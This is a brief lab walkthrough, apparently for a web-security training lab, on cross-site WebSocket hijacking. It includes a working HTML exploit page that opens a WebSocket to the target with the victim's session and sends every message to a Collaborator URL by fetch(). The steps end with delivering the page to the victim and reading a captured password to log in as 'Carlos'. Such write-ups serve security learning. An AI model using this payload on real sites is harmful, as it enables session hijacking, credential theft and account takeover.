# Cross-site WebSocket hijacking

This time we need to use CSRF.

Here is the code to use in Collaborator:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <Title>Doc</Title>
</head>
<body>
    <h1> Hi </h1>

    <script>
        var ws = new WebSocket('wss://your-websocket-url');
        ws.onopen = function() {
            ws.send("READY");
        };

        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {
                method: 'POST',
                mode: 'no-cors', 
                body: event.data}
            );
        };
    </script>
</body>
</html>
```

To get the WebSocket URL, you can check dev tools.

Like that:

<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/274afcf8-5bdf-422c-8145-d965bdaa017c" />

After you finish the code, pass it to the exploit server.
Later, store it and deliver the exploit to the victim.


<img width="525" height="282" alt="image" src="https://github.com/user-attachments/assets/86ceb296-0cd3-4471-80a8-3c6bf67d1761" />

If everything is correct, check Collaborator for the password that we can use to login to Carlos.

<img width="515" height="210" alt="image" src="https://github.com/user-attachments/assets/b8bf55c0-7d39-47c7-ad2e-aa0548265ad8" />


